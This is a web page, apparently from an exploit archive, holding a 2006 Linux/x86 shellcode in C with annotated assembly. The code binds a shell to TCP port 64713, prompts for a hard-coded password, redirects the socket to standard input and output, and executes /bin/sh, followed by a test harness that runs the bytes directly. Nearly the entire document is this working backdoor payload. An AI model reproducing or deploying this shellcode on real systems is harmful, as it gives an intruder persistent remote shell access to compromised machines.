<html><head><title>Linux/x86 - Password Authentication portbind port 64713/tcp - 166 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 * linux-x86-authportbind.c - AUTH portbind shellcode 166 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security &lt;xgc@gotfault.net&gt;
 * 
 * portbind shellcode that bind()'s a shell on port 64713/tcp
 * and requests a user password.
 *
 */

char shellcode[] = 

  /* socket(AF_INET, SOCK_STREAM, 0) */

  &quot;\x6a\x66&quot;			// push   $0x66
  &quot;\x58&quot;			// pop    %eax
  &quot;\x6a\x01&quot;			// push   $0x1
  &quot;\x5b&quot;			// pop    %ebx
  &quot;\x99&quot;			// cltd
  &quot;\x52&quot;			// push   %edx
  &quot;\x53&quot;			// push   %ebx
  &quot;\x6a\x02&quot;			// push   $0x2
  &quot;\x89\xe1&quot;			// mov    %esp,%ecx
  &quot;\xcd\x80&quot;			// int    $0x80

  /* bind(s, server, sizeof(server)) */

  &quot;\x52&quot;			// push   %edx
  &quot;\x66\x68\xfc\xc9&quot;		// pushw  $0xc9fc  // PORT = 64713
  &quot;\x66\x6a\x02&quot;		// pushw  $0x2
  &quot;\x89\xe1&quot;			// mov    $esp,%ecx
  &quot;\x6a\x10&quot;			// push   $0x10
  &quot;\x51&quot;			// push   %ecx
  &quot;\x50&quot;			// push   %eax
  &quot;\x89\xe1&quot;			// mov    %esp,%ecx
  &quot;\x89\xc6&quot;			// mov    %eax,%esi
  &quot;\x43&quot;			// inc    %ebx
  &quot;\xb0\x66&quot;			// mov    $0x66,%al
  &quot;\xcd\x80&quot;			// int    $0x80

  /* listen(s, anything) */

  &quot;\xb0\x66&quot;			// mov    $0x66,%al
  &quot;\xd1\xe3&quot;			// shl    %ebx
  &quot;\xcd\x80&quot;			// int    $0x80

  /* accept(s, 0, 0) */

  &quot;\x52&quot;			// push   %edx
  &quot;\x52&quot;			// push   %edx
  &quot;\x56&quot;			// push   %esi
  &quot;\x89\xe1&quot;			// mov    %esp,%ecx
  &quot;\x43&quot;			// inc    %ebx
  &quot;\xb0\x66&quot;			// mov    $0x66,%al
  &quot;\xcd\x80&quot;			// int    $0x80

  &quot;\x96&quot;			// xchg   %eax,%esi

  /* send(s, &quot;Password: &quot;, 0x0a, flags) */

  &quot;\x52&quot;			// push   %edx
  &quot;\x68\x72\x64\x3a\x20&quot;	// push   $0x203a6472
  &quot;\x68\x73\x73\x77\x6f&quot;	// push   $0x6f777373
  &quot;\x66\x68\x50\x61&quot;		// pushw  $0x6150
  &quot;\x89\xe7&quot;			// mov    $esp,%edi
  &quot;\x6a\x0a&quot;			// push   $0xa
  &quot;\x57&quot;			// push   %edi
  &quot;\x56&quot;			// push   %esi
  &quot;\x89\xe1&quot;			// mov    %esp,%ecx
  &quot;\xb3\x09&quot;			// mov    $0x9,%bl
  &quot;\xb0\x66&quot;			// mov    $0x66,%al
  &quot;\xcd\x80&quot;			// int    $0x80

  /* recv(s, *buf, 0x08, flags) */

  &quot;\x52&quot;			// push   %edx
  &quot;\x6a\x08&quot;			// push   $0x8
  &quot;\x8d\x4c\x24\x08&quot;		// lea    0x8(%esp),%ecx
  &quot;\x51&quot;			// push   %ecx
  &quot;\x56&quot;			// push   %esi
  &quot;\x89\xe1&quot;			// mov    %esp,%ecx
  &quot;\xb3\x0a&quot;			// mov    $0xa,%bl
  &quot;\xb0\x66&quot;			// mov    $0x66,%al
  &quot;\xcd\x80&quot;			// int    $0x80

  &quot;\x87\xf3&quot;			// xchg   %esi,%ebx

  /* like: strncmp(string1, string2, 0x8) */
  
  &quot;\x52&quot;                        // push   %edx
  &quot;\x68\x61\x75\x6c\x74&quot;	// push   $0x746c7561 // password
  &quot;\x68\x67\x6f\x74\x66&quot;	// push   $0x66746f67 // here
  &quot;\x89\xe7&quot;			// mov    %esp,%edi
  &quot;\x8d\x74\x24\x1c&quot;		// lea    0x1c(%esp),%esi
  &quot;\x89\xd1&quot;			// mov    %edx,%ecx
  &quot;\x80\xc1\x08&quot;		// add    $0x8,%cl
  &quot;\xfc&quot;			// cld
  &quot;\xf3\xa6&quot;			// repz   cmpsb %es:(%edi),%ds:(%esi)
  &quot;\x74\x04&quot;			// je     dup

  /* exit(something) */

  &quot;\xf7\xf0&quot;			// div    %eax
  &quot;\xcd\x80&quot;			// int    $0x80

  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */

  &quot;\x6a\x02&quot;			// push   $0x2
  &quot;\x59&quot;			// pop    %ecx

  &quot;\xb0\x3f&quot;			// mov    $0x3f,%al
  &quot;\xcd\x80&quot;			// int    $0x80
  &quot;\x49&quot;			// dec    %ecx
  &quot;\x79\xf9&quot;			// jns    dup_loop

  /* execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) */

  &quot;\x6a\x0b&quot;			// push   $0xb
  &quot;\x58&quot;			// pop    %eax
  &quot;\x52&quot;			// push   %edx
  &quot;\x68\x2f\x2f\x73\x68&quot;	// push   $0x68732f2f
  &quot;\x68\x2f\x62\x69\x6e&quot;	// push   $0x6e69622f
  &quot;\x89\xe3&quot;			// mov    %esp, %ebx
  &quot;\x52&quot;			// push   %edx
  &quot;\x53&quot;			// push   %ebx
  &quot;\x89\xe1&quot;			// mov    %esp, %ecx
  &quot;\xcd\x80&quot;;			// int    $0x80


int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf(&quot;Length: %u\n&quot;, strlen(shellcode));
        f();
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
